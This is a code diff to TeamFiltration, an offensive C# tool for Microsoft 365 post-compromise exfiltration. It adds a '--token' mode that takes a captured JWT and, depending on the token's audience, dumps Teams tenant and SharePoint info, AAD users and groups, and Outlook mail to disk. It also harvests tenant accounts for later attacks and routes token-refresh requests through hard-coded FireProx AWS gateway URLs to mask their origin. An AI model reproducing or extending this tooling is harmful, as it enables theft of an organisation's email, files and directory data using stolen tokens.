@@ -164,6 +164,19 @@ namespace TeamFiltration.Modules
                 await PrepareExfilCreds(username, password, exfilOptions, msolHandler);
 
             }
+            else if (args.Contains("--token"))
+            {
+
+                var jwtToken = args.GetValue("--token");
+                var tokenObject = new BearerTokenResp()
+                {
+
+                    access_token = jwtToken,
+                    refresh_token = "",
+                };
+                await SingleTokenExfilAccountAsync(_globalProperties.OutPutPath, tokenObject, exfilOptions, msolHandler);
+
+            }
             else if (args.Contains("--cookie-dump"))
             {
                 Console.WriteLine("[+] Reading cookie dump file");
@@ -332,26 +345,7 @@ namespace TeamFiltration.Modules
             else
             {
                 #region userCreds
-                /*
-                var proxyURL = "https://ldhrjli2af.execute-api.eu-west-3.amazonaws.com/fireprox/common/oauth2/token";
-          
-
-                foreach (var resource in resList)
-                {
-                    var loginResp = await msolHandler.RefreshAttempt(bearerToken, proxyURL, resource.uri, resource.clientId);
-
-                    if (loginResp.bearerTokenError == null)
-                    {
-                        validResList.Add(resource);
-                        _databaseHandler.WriteLog(new Log("EXFIL", $" URI { resource.uri } CLIENTID {resource.clientId} => CAN ACCESS", "[EU]") { }, true);
-                    }
-                    else
-                    {
-                        _databaseHandler.WriteLog(new Log("EXFIL", $" URI { resource.uri } CLIENTID {resource.clientId} => DENIED ACCESS", "[EU]") { }, true);
-                    }
-
-                }
-                */
+               
                 var proxyURL = "https://694qkn4gp3.execute-api.us-west-1.amazonaws.com/fireprox/common/oauth2/token";
                 foreach (var resource in resList)
                 {
@@ -508,10 +502,7 @@ namespace TeamFiltration.Modules
             var username = Helpers.Generic.GetUsername(teamsToken.access_token);
 
             var teamsHandler = new TeamsHandler(teamsToken, _globalProperties);
-            //var oneDriveHandler = new OneDriveHandler(graphToken, username, _teamFiltrationConfig);
-
-
-
+         
             _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating recently used contacts", "") { }, true);
             var contactListLogsOutPath = Path.Combine(outpath, "Contactlist");
             Directory.CreateDirectory(contactListLogsOutPath);
@@ -733,18 +724,20 @@ namespace TeamFiltration.Modules
             var username = Helpers.Generic.GetUsername(msGraphToken.access_token);
             var graphUsers = await graphHandler.GetUsersMsGraph();
 
+            if (!username.StartsWith("MissingUsername_"))
+            {
 
-            var filteredUserPrincipalNames = graphUsers.value.Where(x => x.userPrincipalName.EndsWith("@" + username.Split("@")[1])).ToList();
-            if (logDb)
-                _databaseHandler.WriteLog(new Log("EXFIL", $"Got {filteredUserPrincipalNames.Count} AAD users, appending to database as valid users!", "") { }, true);
-            await filteredUserPrincipalNames.ParallelForEachAsync(
-                 async upn =>
-                 {
-                     if (logDb)
-                         _databaseHandler.WriteValidAcc(new ValidAccount() { Username = upn.userPrincipalName.Trim().ToLower(), Id = Helpers.Generic.StringToGUID(upn.userPrincipalName.Trim().ToLower()).ToString() });
-                 },
-                   maxDegreeOfParallelism: 700);
-
+                var filteredUserPrincipalNames = graphUsers.value.Where(x => x.userPrincipalName.EndsWith("@" + username.Split("@")[1])).ToList();
+                if (logDb)
+                    _databaseHandler.WriteLog(new Log("EXFIL", $"Got {filteredUserPrincipalNames.Count} AAD users, appending to database as valid users!", "") { }, true);
+                await filteredUserPrincipalNames.ParallelForEachAsync(
+                     async upn =>
+                     {
+                         if (logDb)
+                             _databaseHandler.WriteValidAcc(new ValidAccount() { Username = upn.userPrincipalName.Trim().ToLower(), Id = Helpers.Generic.StringToGUID(upn.userPrincipalName.Trim().ToLower()).ToString() });
+                     },
+                       maxDegreeOfParallelism: 700);
+            }
 
             File.WriteAllText(Path.Combine(baseUserOutPath, "MsGraph_Users.txt"), string.Join('\n', graphUsers.value.Select(x => x.userPrincipalName).ToList()));
             File.WriteAllText(Path.Combine(baseUserOutPath, "MsGraph_Users.json"), JsonConvert.SerializeObject(graphUsers, Formatting.Indented));
@@ -758,7 +751,6 @@ namespace TeamFiltration.Modules
             Models.Graph.GroupsResp adGroups = await graphHandler.GetGroupsMsGraph();
             File.WriteAllText(Path.Combine(baseUserOutPath, "MsGraph_Groups.json"), JsonConvert.SerializeObject(adGroups, Formatting.Indented));
 
-            //var adGroups = JsonConvert.DeserializeObject<GroupsResp>(File.ReadAllText(Path.Combine(baseUserOutPath, "AADGroups.json")));
             var userGroupRelations = new StringBuilder();
             try
             {
@@ -804,7 +796,9 @@ namespace TeamFiltration.Modules
         {
 
             _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating AAD users and groups via MS AD Graph API", "") { }, true);
+
             var tenantId = Helpers.Generic.GetTenantId(adGraphToken.access_token);
+
             GraphHandler graphHandler = new GraphHandler(adGraphToken, Helpers.Generic.GetUsername(adGraphToken.access_token));
 
             var adUsers = await graphHandler.GetUsersAdGraph(tenantId);
@@ -837,10 +831,8 @@ namespace TeamFiltration.Modules
                         {
                             try
                             {
-
-
                                 var userName = (string.IsNullOrEmpty(user.userPrincipalName)) ? user.mail : user.userPrincipalName;
-                                //sr.WriteLine($"{userName}:{groupObject.displayName}");
+                            
                                 if (!string.IsNullOrEmpty(userName))
                                     userGroupRelations.AppendLine($"{user.userPrincipalName}:{groupObject.onPremisesSamAccountName}");
                             }
@@ -999,6 +991,114 @@ namespace TeamFiltration.Modules
             }
 
         }
+        private static async Task SingleTokenExfilAccountAsync(string outpath, BearerTokenResp anyToken, ExifilOptions exifilOptions, MSOLHandler msolHandler)
+        {
+
+            JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();
+            JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(anyToken.access_token);
+
+            jwtSecToken.Payload.TryGetValue("aud", out var validResc);
+            string username = Helpers.Generic.GetUsername(anyToken.access_token);
+
+
+            var baseUserOutPath = Path.Combine(outpath, Helpers.Generic.MakeValidFileName(username));
+            Directory.CreateDirectory(baseUserOutPath);
+
+
+            //If this token is a teams access token
+            if (validResc.ToString().Contains("api.spaces.skype.com"))
+            {
+                _databaseHandler.WriteLog(new Log("EXFIL", $"This is an Teams access token, perfoming possbile data exfil", "") { }, true);
+
+                TeamsHandler teamsHandler = new TeamsHandler(anyToken, _globalProperties);
+
+                List<GetTenatsResp> tenantInfo = await teamsHandler.GetTenantsInfo();
+                FilesAvailabilityResp sharePointInfo = await teamsHandler.GetSharePointInfo();
+
+
+
+                File.WriteAllText(Path.Combine(baseUserOutPath, "Tenant.json"), JsonConvert.SerializeObject(tenantInfo, Formatting.Indented));
+                File.WriteAllText(Path.Combine(baseUserOutPath, "SharePoint.json"), JsonConvert.SerializeObject(sharePointInfo, Formatting.Indented));
+
+
+                string companySharePointUrl = "";
+                string personalSharePointUrl = "";
+
+                if (sharePointInfo?.personalRootFolderUrl == null)
+                {
+                    _databaseHandler.WriteLog(new Log("EXFIL", $"User has not been configured / licensed for o365, skipping OneDrive/SharePoint", "") { }, true);
+
+                    sharePointInfo = new FilesAvailabilityResp();
+                    sharePointInfo.personalRootFolderUrl = "invalid";
+                    exifilOptions.OneDrive = false;
+
+                }
+                else
+                {
+                    companySharePointUrl = sharePointInfo.personalRootFolderUrl.Replace("-my", "");
+                    personalSharePointUrl = sharePointInfo.personalRootFolderUrl;
+                }
+
+            }
+
+
+            if (validResc.ToString().Contains("graph.windows.net"))
+            {
+                await AdGraphExfilAsync(anyToken, baseUserOutPath);
+            }
+
+
+            if (validResc.ToString().Contains("graph.microsoft.com"))
+            {
+                await MsGraphExfilAsync(anyToken, baseUserOutPath);
+
+            }
+
+            if (validResc.ToString().Contains("outlook.office.com"))
+            {
+                await OWAExfilAsync(anyToken, baseUserOutPath);
+
+               // File.WriteAllText(Path.Combine(outlookOutPath, "Emails.json"), JsonConvert.SerializeObject(allEmails, Formatting.Indented));
+            }
+
+            /*
+            if (exifilOptions.Teams)
+            {
+                //Get the tokens neede if we don't already have them
+                if (personalOneDriveToken.bearerToken?.access_token == null)
+                    personalOneDriveToken = await msolHandler.RefreshAttempt(anyToken, _globalProperties.GetFireProxURL(), personalSharePointUrl);
+
+                //Did we get them, if so let's exfil!
+                if (anyToken?.access_token != null && personalOneDriveToken.bearerToken?.access_token != null)
+                    await TeamsExfilAsync(anyToken, personalOneDriveToken.bearerToken, baseUserOutPath);
+
+
+
+
+            }
+
+            if (exifilOptions.OneDrive)
+            {
+
+                //Get the tokens neede if we don't already have them
+                if (companySharePointToken.bearerToken?.access_token == null)
+                    companySharePointToken = await msolHandler.RefreshAttempt(anyToken, _globalProperties.GetFireProxURL(), companySharePointUrl);
+
+                if (personalOneDriveToken.bearerToken?.access_token == null)
+                    personalOneDriveToken = await msolHandler.RefreshAttempt(anyToken, _globalProperties.GetFireProxURL(), personalSharePointUrl);
+
+                if (msGraphToken.bearerToken?.access_token == null)
+                    msGraphToken = await msolHandler.RefreshAttempt(anyToken, _globalProperties.GetFireProxURL(), "https://graph.microsoft.com");
+
+
+                //Did we get them, if so let's exfil!
+                if (msGraphToken.bearerToken != null && companySharePointToken.bearerToken != null && anyToken != null)
+                    await OneDriveExfilAsync(companySharePointToken.bearerToken, msGraphToken.bearerToken, anyToken, personalOneDriveToken.bearerToken, baseUserOutPath);
+
+            }
+            */
+        }
+
         private static async Task RefreshExfilAccountAsync(string outpath, BearerTokenResp teamsToken, ExifilOptions exifilOptions, MSOLHandler msolHandler)
         {
 
